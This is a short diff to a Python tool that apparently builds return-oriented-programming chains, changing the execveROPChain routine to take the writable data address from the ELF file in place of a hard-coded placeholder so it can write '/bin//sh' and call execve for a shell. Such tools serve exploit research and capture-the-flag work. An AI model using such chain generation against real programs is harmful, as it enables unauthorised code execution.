@@ -131,7 +131,7 @@ def canWrite(movQwordGadgets, popGadgets):
 
 def WriteStuffIntoMemory(GadgetList, data, addr, fd) : 
 
-    popGadgets = getPopGadgets(GadgetList) #TODO we can sophisticate this with LoadConstIntoReg-kind of idea
+    popGadgets = getPopGadgets(GadgetList) #TODO use LoadConstIntoReg
     movQwordGadgets = getMovQwordGadgets(GadgetList)
     movpopGadgets = canWrite(movQwordGadgets, popGadgets)
 
@@ -218,19 +218,13 @@ def writeFooter(fd):
     fd.write("\n\t")
     fd.close()
 
-def execveROPChain(GadgetList): 
+def execveROPChain(GadgetList, elf): 
 
     print("\n\n-->Chaining to get a shell using execve system call")
     """ Get a section from the file, by name. Return None if no such
             section exists.
     """
-# TODO
-#    data_section = ".data"
-#    section = get_section_by_name(data_section)
-    
-    # We need .data section's details because we have to write "/bin//sh" into it. 
-#    data_section_addr = section["sh_addr"]
-    data_section_addr = 0xdeadbeef
+    data_section_addr = elf.getWritableDataSegments()[0].offset_in_elf #TODO: Should be offset in loaded image
 
     syscallList1 = checkIfSyscallPresent(GadgetList)
     
